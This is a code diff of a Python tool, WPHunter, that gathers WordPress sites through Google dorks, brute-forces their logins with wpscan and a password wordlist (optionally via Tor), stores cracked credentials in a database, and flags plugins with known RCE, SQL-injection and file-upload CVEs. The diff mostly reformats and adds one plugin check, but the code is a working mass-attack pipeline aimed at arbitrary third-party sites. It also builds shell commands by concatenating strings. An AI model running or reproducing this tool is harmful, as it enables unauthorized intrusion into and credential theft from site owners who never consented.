@@ -27,35 +27,52 @@ def checkvuln(pathfile):
         if 'password_attack' in obj_data:
             # CHECK CORE WORDPRESS VULNERABLE VERSION
             if str(obj_data['version']['number']) == '4.6':
-                print(colored("\t > Found WordPress " + obj_data['version']['number'] + " vulnerable to RCE (CVE-2016-10033)", 'magenta'))
+                print(colored(
+                    "\t > WordPress " + obj_data['version']['number'] + " vulnerable to RCE (CVE-2016-10033)",
+                    'magenta'))
                 time.sleep(5)
 
             # JOOMSPORT
-            if 'joomsport' in str(obj_data) and obj_data['plugins']['joomsport-sports-league-results-management']['version']:
+            if 'joomsport' in str(obj_data) and obj_data['plugins']['joomsport-sports-league-results-management'][
+                'version']:
                 # Check for vulnerability version in JoomSport 3.3 - SQL INJECTION
                 if str(obj_data['plugins']['joomsport-sports-league-results-management']['version']['number']) == '3.3':
-                    print(colored("\t > Found JoomSport " + obj_data['plugins']['joomsport-sports-league-results-management']['version']['number'] + " vulnerable to SQL Injection (CVE-2019-14348)", 'magenta'))
+                    print(colored("\t > JoomSport " +
+                                  obj_data['plugins']['joomsport-sports-league-results-management']['version'][
+                                      'number'] + " vulnerable to SQL Injection (CVE-2019-14348)", 'magenta'))
                     time.sleep(5)
 
             # SOCIAL WARFARE
             if 'Social Warfare' in str(obj_data) and obj_data['plugins']['social-warfare']['version']:
                 # Check for vulnerability version in Social Warfare Plugin < 3.5.3 - RCE
                 if str(obj_data['plugins']['social-warfare']['version']['number']) < '3.5.3':
-                    print(colored("\t > Found Social Warfare " + obj_data['plugins']['social-warfare']['version']['number'] + " vulnerable to Remote Code Execution (CVE-2019-9978)", 'magenta'))
+                    print(colored("\t > Social Warfare " + obj_data['plugins']['social-warfare']['version'][
+                        'number'] + " vulnerable to Remote Code Execution (CVE-2019-9978)", 'magenta'))
                     time.sleep(5)
 
             # CONTACT FORM 7
             if 'contact-form-7' in str(obj_data) and obj_data['plugins']['contact-form-7']['version']:
                 # Check for vulnerability version in Contact Form 7 - Unrestricted File Upload
                 if str(obj_data['plugins']['contact-form-7']['version']['number']) < '5.3.2':
-                    print(colored("\t > Found Contact Form " + obj_data['plugins']['contact-form-7']['version']['number'] + " vulnerable to Unrestricted File Upload (CVE-2020-35489)", 'magenta'))
+                    print(colored("\t > Contact Form " + obj_data['plugins']['contact-form-7']['version'][
+                        'number'] + " vulnerable to Unrestricted File Upload (CVE-2020-35489)", 'magenta'))
                     time.sleep(5)
 
             # YOAST SEO
-            if 'wordpress-seo' in str(obj_data) and obj_data['plugins']['wordpress-seo']['version']:
-                # Check for vulnerability version in Yoast SEO - Blind SQL Injection
-                if str(obj_data['plugins']['wordpress-seo']['version']['number']) == '1.7.3.3':
-                    print(colored("\t > Found Yoast SEO " + obj_data['plugins']['wordpress-seo']['version']['number'] + " vulnerable to Blind SQL Injection (CVE-2015-2292)", 'magenta'))
+            if 'wordpress-seo-premium' not in str(obj_data):
+                if 'wordpress-seo' in str(obj_data) and obj_data['plugins']['wordpress-seo']['version']:
+                    # Check for vulnerability version in Yoast SEO - Blind SQL Injection
+                    if str(obj_data['plugins']['wordpress-seo']['version']['number']) == '1.7.3.3':
+                        print(colored("\t > Yoast SEO " + obj_data['plugins']['wordpress-seo']['version'][
+                            'number'] + " vulnerable to Blind SQL Injection (CVE-2015-2292)", 'magenta'))
+                        time.sleep(5)
+
+            # WP FILE MANAGER
+            if 'wp-file-manager' in str(obj_data) and obj_data['plugins']['wp-file-manager']['version']:
+                # Check for vulnerability version in WP File Manager - Unauthenticated Arbitary File Upload
+                if str(obj_data['plugins']['wp-file-manager']['version']['number']) < '6.9':
+                    print(colored("\t > WP File Manager " + obj_data['plugins']['wp-file-manager']['version'][
+                        'number'] + " vulnerable to Unauthenticated Arbitary File Upload (CVE-2020-25213)", 'magenta'))
                     time.sleep(5)
 
         # Check for some errors, timeouts, waf and so on..
@@ -68,9 +85,13 @@ def checkvuln(pathfile):
         elif 'scan_aborted' in str(obj_data):
             print(colored("\t > Aborted due to some redirect or website not running Wordpress!", 'red'))
             time.sleep(5)
+        elif 'Couldn\'t connect to server' in str(obj_data):
+            print(colored("\t > Couldn't connect to server!", 'red'))
+            time.sleep(5)
         else:
             print(colored("\t > Aborted for unrecognized error!", 'red'))
             time.sleep(5)
+
 
 def showdorks():
     """Show Wordpress google dorks available and returns choosen"""
@@ -112,10 +133,10 @@ def showdorks():
     dork = "\"index of\" inurl:wp-content/\""
 
     while True:
-        response = input(colored(" Choose dork to run [1-8] ", 'yellow'))
+        response = input(colored(" > Choose dork to run [1-8] ", 'yellow'))
         if not response.isnumeric():
             continue
-        elif int(response) in range(1,9):
+        elif int(response) in range(1, 9):
             if int(response) == 1:
                 dork = dork1
             elif int(response) == 2:
@@ -181,14 +202,15 @@ def savecreds(pathfile, url):
         # Reading JSON from file - a nested dict -
         with open(pathfile) as json_file:
             obj_data = json.load(json_file)
-            # If 'password_attack' string is found then means that scan was successful
+            # If 'password_attack' string is then means that scan was successful
             if 'password_attack' in obj_data:
                 for username in obj_data['password_attack']:
-                    # username var will be empty if no creds found so insert will not be triggered
+                    # username var will be empty if no creds so insert will not be triggered
                     if username:
                         print(colored("\t > Pw3ned - Valid Credentials Found!", 'magenta'))
                         # Write credentials to db
-                        cursor.execute("INSERT INTO Credentials VALUES (?, ?, ?)", (username, obj_data['password_attack'][username]['password'], url))
+                        cursor.execute("INSERT INTO Credentials VALUES (?, ?, ?)",
+                                       (username, obj_data['password_attack'][username]['password'], url))
                         connection.commit()
 
         cursor.close()
@@ -201,12 +223,14 @@ def wpscan(wpurl, wordlists, pathfile, usetor):
 
     if usetor:
         # Run wpscan with tor
-        os.system("wpscan --disable-tls-checks --request-timeout 500 --connect-timeout 120 --url " + wpurl + " --proxy socks5://127.0.0.1:9050 --rua -o " + pathfile + " -f json --passwords " + wordlists)
+        os.system(
+            "wpscan --disable-tls-checks --request-timeout 500 --connect-timeout 120 --url " + wpurl + " --proxy socks5://127.0.0.1:9050 --rua -o " + pathfile + " -f json --passwords " + wordlists)
         checkvuln(pathfile)
         savecreds(pathfile, wpurl)
     else:
         # Run wpscan without tor
-        os.system("wpscan --disable-tls-checks --url " + wpurl + " --rua -o " + pathfile + " -f json --passwords " + wordlists)
+        os.system(
+            "wpscan --disable-tls-checks --url " + wpurl + " --rua -o " + pathfile + " -f json --passwords " + wordlists)
         checkvuln(pathfile)
         savecreds(pathfile, wpurl)
 
@@ -227,7 +251,7 @@ def googledork(dork, amount, wordlist, usetor):
     for result in search(dork, tld="com", lang="en", num=int(amount), start=0, stop=None, pause=8):
         parsed_uri = urlparse(result)
         wordpress = '{uri.scheme}://{uri.netloc}/'.format(uri=parsed_uri)
-        #wordpress = "http://192.168.1.33/wordpress/"
+        # wordpress = "http://192.168.1.33/wordpress/"
 
         # Create filename
         filename = parsed_uri.netloc + ".json".strip('\n')
@@ -259,7 +283,7 @@ def main():
  ░░████╔═████║░██╔═══╝░██╔══██║██║░░░██║██║╚████║░░░██║░░░██╔══╝░░██╔══██╗
  ░░╚██╔╝░╚██╔╝░██║░░░░░██║░░██║╚██████╔╝██║░╚███║░░░██║░░░███████╗██║░░██║
  ░░░╚═╝░░░╚═╝░░╚═╝░░░░░╚═╝░░╚═╝░╚═════╝░╚═╝░░╚══╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝
-        
+
  WPHunter 1.0 (c)2021 by calfcrusher@inventati.org - for legal purpose only
     \x1b[0m""")
 
@@ -281,7 +305,7 @@ def main():
     print()
 
     while True:
-        response = input(colored(" Enter your choice [1-3] ", 'yellow'))
+        response = input(colored(" > Enter your choice [1-3] ", 'yellow'))
         if not response.isnumeric():
             main()
             continue
@@ -299,7 +323,7 @@ def main():
     dork = showdorks()
 
     while True:
-        response = input(colored(" Enter number of results to retrieve: ", 'yellow'))
+        response = input(colored(" > Enter number of results to retrieve: ", 'yellow'))
         if not response.isnumeric():
             print(colored(" Please insert a number", 'red'))
             continue
@@ -307,7 +331,7 @@ def main():
             amount = response
             break
     while True:
-        response = input(colored(" Type full path to password wordlist: ", 'yellow'))
+        response = input(colored(" > Type full path to password wordlist: ", 'yellow'))
         if not os.path.isfile(response):
             print(colored(" Unable to access file !", 'red'))
             continue
@@ -318,7 +342,7 @@ def main():
     usetor = False
 
     while True:
-        response = input(colored(" Use WPscan with TOR ? [yes/no] ", 'yellow'))
+        response = input(colored(" > Use WPscan with TOR ? [yes/no] ", 'yellow'))
         if not response.isalpha():
             continue
         if response == 'yes' or response == 'no':
